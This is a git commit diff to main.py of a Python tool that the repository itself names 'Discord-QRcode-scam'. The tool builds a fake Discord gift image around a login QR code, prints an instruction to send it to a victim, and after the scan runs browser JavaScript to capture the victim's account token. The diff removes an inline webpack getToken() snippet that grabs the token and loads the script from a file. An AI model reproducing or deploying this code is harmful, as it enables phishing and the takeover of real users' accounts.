7e0a38fbfe9b6362299e681423451d9011242c25
Jupiter404E <92510876+Jupiter404E@users.noreply.github.com>
2022-12-16 23:32:05 +0200

    Update main.py

--- main.py
+++ main.py
@@ -3,21 +3,21 @@ init()
 from bs4 import BeautifulSoup
 from selenium import webdriver
 from PIL import Image
-import base64, time, os
+import base64, time, os, js2py
 from banner import BANNER
 
 # By Jupiter404E
 
 def logo_qr():
-    im1 = Image.open("temp/qr_code.png", "r")
-    im2 = Image.open("temp/overlay.png", "r")
+    im1 = Image.open("temp\\qr_code.png", "r")
+    im2 = Image.open("temp\\overlay.png", "r")
     im2_w, im2_h = im2.size
     im1.paste(im2, (60, 55))
     im1.save("temp/final_qr.png", quality=95)
 
 def paste_template():
-    im1 = Image.open("temp/template.png", "r")
-    im2 = Image.open("temp/final_qr.png", "r")
+    im1 = Image.open("temp\\template.png", "r")
+    im2 = Image.open("temp\\final_qr.png", "r")
     im1.paste(im2, (120, 409))
     im1.save("discord_gift.png", quality=95)
 
@@ -56,9 +56,8 @@ def main():
     print("Send the QR code to the user. Wait for it to scan it...")
     while True:
         if discord_login != driver.current_url:
-            driver.execute_script("""
-            alert((webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken());
-            """)
+            with open("script.js", "r") as file:
+                driver.execute_script(file.read())
             break
     print("\nRate me!{} At https://github.com/Jupiter404E/Discord-QRcode-scam\n".format(Fore.WHITE))
 
